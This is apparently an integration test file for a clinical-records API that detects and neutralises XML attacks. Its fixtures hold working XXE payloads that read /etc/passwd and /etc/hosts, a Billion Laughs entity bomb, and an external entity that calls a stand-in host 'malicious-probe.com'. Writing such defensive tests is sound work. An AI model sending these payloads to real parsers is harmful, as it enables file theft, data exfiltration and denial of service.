/**
 * Testes de Integração da API REST de Detecção e Prevenção de XXE e XML Bombs
 * (CWE-611, CWE-776 & HL7/FHIR XML)
 */

import { describe, it, expect } from 'bun:test';
import { app } from '../src/index';
import {
  XmlThreatType,
  XmlClinicalSchemaType,
  XmlSanitizationMode,
  type XmlGuardOverviewResponse,
  type ScanXmlPayloadResponse,
  type UpdateXmlPolicyResponse,
  type SimulateXmlAttackResponse,
  type VerifyXmlSealResponse
} from '@terapiainfoco/shared';
import { adminRequest } from './helpers/adminRequest';

describe('XML Security Guard REST API (/api/xml-guard)', () => {
  it('GET /api/xml-guard/overview - deve retornar telemetria, política ativa e esquemas suportados', async () => {
    const res = await adminRequest('/api/xml-guard/overview', {
      method: 'GET'
    });

    expect(res.status).toBe(200);
    const body = (await res.json()) as XmlGuardOverviewResponse;
    expect(body.success).toBe(true);
    expect(body.overview.metrics).toBeDefined();
    expect(body.overview.policy).toBeDefined();
    expect(body.overview.supportedSchemas).toContain(XmlClinicalSchemaType.HL7_CDA_R2);
    expect(body.overview.recentIncidents).toBeInstanceOf(Array);
  });

  it('POST /api/xml-guard/scan - deve validar e aprovar documento clínico legítimo', async () => {
    const validXml = `<?xml version="1.0" encoding="UTF-8"?>
<ClinicalDocument xmlns="urn:hl7-org:v3">
  <id extension="DOC-12345" root="2.16.840.1.113883.3.72"/>
  <code code="34133-9" displayName="Summarization of Episode Note"/>
  <title>Evolução Psicológica Semanal</title>
  <component>
    <structuredBody>
      <section>
        <text>Paciente apresentou melhora nos sintomas de ansiedade generalizada.</text>
      </section>
    </structuredBody>
  </component>
</ClinicalDocument>`;

    const res = await adminRequest('/api/xml-guard/scan', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        xmlPayload: validXml,
        schemaType: XmlClinicalSchemaType.HL7_CDA_R2,
        mode: XmlSanitizationMode.STRIP_DTD_AND_PARSE
      })
    });

    expect(res.status).toBe(200);
    const body = (await res.json()) as ScanXmlPayloadResponse;
    expect(body.success).toBe(true);
    expect(body.result.isSafe).toBe(true);
    expect(body.result.threats.length).toBe(0);
    expect(body.result.seal.sealId).toStartWith('xml_guard_v1_');
    expect(body.result.sanitizedXml).toContain('Evolução Psicológica Semanal');
  });

  it('POST /api/xml-guard/scan - deve interceptar ataque XXE SYSTEM e neutralizar DTD', async () => {
    const xxeXml = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ClinicalDocument [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<ClinicalDocument xmlns="urn:hl7-org:v3">
  <title>Prontuário com Injeção &xxe;</title>
</ClinicalDocument>`;

    const res = await adminRequest('/api/xml-guard/scan', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        xmlPayload: xxeXml,
        schemaType: XmlClinicalSchemaType.HL7_CDA_R2,
        mode: XmlSanitizationMode.STRIP_DTD_AND_PARSE
      })
    });

    expect(res.status).toBe(200);
    const body = (await res.json()) as ScanXmlPayloadResponse;
    expect(body.success).toBe(true);
    expect(body.result.isSafe).toBe(false);
    expect(body.result.threats.some(t => t.threatType === XmlThreatType.EXTERNAL_ENTITY_SYSTEM)).toBe(true);
    expect(body.result.sanitizedXml).not.toContain('<!DOCTYPE');
    expect(body.result.sanitizedXml).not.toContain('&xxe;');
  });

  it('POST /api/xml-guard/scan - deve desarmar XML Bomb (Billion Laughs) e registrar mitigação', async () => {
    const bombXml = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE bomb [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<ClinicalDocument>&lol3;</ClinicalDocument>`;

    const res = await adminRequest('/api/xml-guard/scan', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        xmlPayload: bombXml,
        schemaType: XmlClinicalSchemaType.HL7_CDA_R2,
        mode: XmlSanitizationMode.STRIP_DTD_AND_PARSE
      })
    });

    expect(res.status).toBe(200);
    const body = (await res.json()) as ScanXmlPayloadResponse;
    expect(body.success).toBe(true);
    expect(body.result.isSafe).toBe(false);
    expect(body.result.threats.some(t => t.threatType === XmlThreatType.BILLION_LAUGHS_BOMB)).toBe(true);
  });

  it('POST /api/xml-guard/scan - deve interceptar inclusão externa via XInclude', async () => {
    const xincludeXml = `<?xml version="1.0" encoding="UTF-8"?>
<ClinicalDocument xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/hosts" parse="text"/>
</ClinicalDocument>`;

    const res = await adminRequest('/api/xml-guard/scan', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        xmlPayload: xincludeXml,
        schemaType: XmlClinicalSchemaType.FHIR_XML_R4
      })
    });

    expect(res.status).toBe(200);
    const body = (await res.json()) as ScanXmlPayloadResponse;
    expect(body.success).toBe(true);
    expect(body.result.isSafe).toBe(false);
    expect(body.result.threats.some(t => t.threatType === XmlThreatType.XINCLUDE_ATTACK)).toBe(true);
    expect(body.result.sanitizedXml).not.toContain('<xi:include');
  });

  it('POST /api/xml-guard/scan - deve rejeitar estritamente no modo STRICT_REJECT quando malicioso', async () => {
    const maliciousXml = `<?xml version="1.0"?>
<!DOCTYPE note [
  <!ENTITY ext SYSTEM "http://malicious-probe.com/leak">
]>
<note>&ext;</note>`;

    const res = await adminRequest('/api/xml-guard/scan', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        xmlPayload: maliciousXml,
        mode: XmlSanitizationMode.STRICT_REJECT
      })
    });

    expect(res.status).toBe(200);
    const body = (await res.json()) as ScanXmlPayloadResponse;
    expect(body.success).toBe(true);
    expect(body.result.isSafe).toBe(false);
    expect(body.result.sanitizedXml).toBe('');
    expect(body.result.parsedData).toBeNull();
  });

  it('PUT /api/xml-guard/policy - deve atualizar parâmetros da política de segurança XML', async () => {
    const res = await adminRequest('/api/xml-guard/policy', {
      method: 'PUT',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        policy: {
          maxNestingDepth: 25,
          maxEntityExpansions: 100
        }
      })
    });

    expect(res.status).toBe(200);
    const body = (await res.json()) as UpdateXmlPolicyResponse;
    expect(body.success).toBe(true);
    expect(body.policy.maxNestingDepth).toBe(25);
    expect(body.policy.maxEntityExpansions).toBe(100);
  });

  it('POST /api/xml-guard/simulate - deve executar simulações adversariais de vetores CWE-611 / CWE-776', async () => {
    const res = await adminRequest('/api/xml-guard/simulate', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        attackType: XmlThreatType.EXTERNAL_ENTITY_SYSTEM,
        schemaType: XmlClinicalSchemaType.HL7_CDA_R2
      })
    });

    expect(res.status).toBe(200);
    const body = (await res.json()) as SimulateXmlAttackResponse;
    expect(body.success).toBe(true);
    expect(body.threatDetected).toBe(true);
    expect(body.incident).toBeDefined();
    expect(body.incident?.threatType).toBe(XmlThreatType.EXTERNAL_ENTITY_SYSTEM);
  });

  it('POST /api/xml-guard/verify-seal - deve verificar com sucesso selo probatório emitido e reprovar selo corrompido', async () => {
    // 1. Gera um selo válido através de scan
    const scanRes = await adminRequest('/api/xml-guard/scan', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        xmlPayload: '<ClinicalDocument><title>Teste Selo</title></ClinicalDocument>',
        schemaType: XmlClinicalSchemaType.CUSTOM_EMR_EXPORT
      })
    });
    const scanBody = (await scanRes.json()) as ScanXmlPayloadResponse;
    const validSealToken = scanBody.result.seal.sealId;

    // 2. Valida selo original
    const verifyRes = await adminRequest('/api/xml-guard/verify-seal', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        sealToken: validSealToken
      })
    });

    expect(verifyRes.status).toBe(200);
    const verifyBody = (await verifyRes.json()) as VerifyXmlSealResponse;
    expect(verifyBody.success).toBe(true);
    expect(verifyBody.isValid).toBe(true);
    expect(verifyBody.seal).toBeDefined();

    // 3. Valida rejeição de selo adulterado
    const tamperedToken = validSealToken + '_tampered';
    const tamperedRes = await adminRequest('/api/xml-guard/verify-seal', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        sealToken: tamperedToken
      })
    });

    expect(tamperedRes.status).toBe(200);
    const tamperedBody = (await tamperedRes.json()) as VerifyXmlSealResponse;
    expect(tamperedBody.success).toBe(true);
    expect(tamperedBody.isValid).toBe(false);
  });
});
